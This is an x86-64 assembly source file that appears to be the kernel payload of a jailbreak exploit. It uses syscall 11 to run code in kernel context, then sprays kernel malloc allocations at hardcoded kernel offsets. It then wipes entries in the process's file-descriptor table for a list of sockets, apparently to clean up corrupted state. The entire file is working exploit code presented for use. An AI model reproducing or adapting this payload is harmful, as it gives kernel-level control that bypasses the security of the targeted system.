use64

%define CLOSEUP_COUNT 512   ;  must match CLOSEUP_ARRAY_SIZE in jb.c

entry:
push rsi
push rdi
mov rsi, rsp
lea rdi, [rel kernel_entry]
mov eax, 11
syscall
pop rdi
pop rsi
ret

kernel_entry:
mov rsi, [rsi+8]           ; rsi = pointer to args
push qword [rsi]           ; socket closeup (array de FDs)
push qword [rsi+8]         ; kernel base
mov rcx, 1024
.malloc_loop:
push rcx
mov rax, [rsp+8]           ; kernel base
mov edi, 0xf8              ; sz
lea rsi, [rax+0x1540eb0]   ; M_TEMP
mov edx, 2
add rax, 0xd7a0            ; malloc
call rax
pop rcx
loop .malloc_loop
pop rdi
pop rsi
test rsi, rsi
jz .skip_closeup
mov rax, [gs:0]            ; curthread
mov rax, [rax+8]           ; td_proc
mov rax, [rax+0x48]        ; p_fd
mov rdx, [rax]             ; fd_ofiles
mov rcx, CLOSEUP_COUNT
cld                        ; DF=0 (defensive)
.closeup_loop:
lodsd                      ; eax = *rsi++, rsi += 4
mov qword [rdx+8*rax], 0   ; fd_ofiles[fd] = 0
loop .closeup_loop
.skip_closeup:
xor eax, eax
ret
align 8
